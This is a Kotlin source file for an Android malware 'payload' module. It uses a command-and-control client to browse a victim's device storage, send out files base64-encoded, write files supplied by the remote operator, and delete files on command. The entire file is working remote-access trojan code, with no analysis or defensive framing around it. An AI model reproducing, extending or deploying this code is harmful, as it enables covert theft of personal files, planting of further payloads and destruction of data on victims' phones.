package com.ihk909.payload.modules

import android.content.Context
import android.util.Base64
import com.ihk909.payload.C2Client
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream

object FilesModule {
    fun list(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val path = args.optString("path", "/sdcard")
            val files = File(path).listFiles()
            val arr = JSONArray()
            files?.forEach { f ->
                arr.put(JSONObject()
                    .put("name", f.name)
                    .put("path", f.absolutePath)
                    .put("dir", f.isDirectory)
                    .put("size", f.length())
                    .put("mtime", f.lastModified()))
            }
            c2.reply(id, JSONObject().put("items", arr))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun download(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val f = File(args.getString("path"))
            if (!f.exists() || f.length() > 10_000_000) {
                c2.replyError(id, "file missing or too large")
                return
            }
            c2.reply(id, JSONObject()
                .put("name", f.name)
                .put("b64", Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun upload(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val bytes = Base64.decode(args.getString("b64"), Base64.NO_WRAP)
            FileOutputStream(args.getString("path")).use { it.write(bytes) }
            c2.reply(id, JSONObject().put("written", bytes.size))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun delete(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val ok = File(args.getString("path")).delete()
            c2.reply(id, JSONObject().put("deleted", ok))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}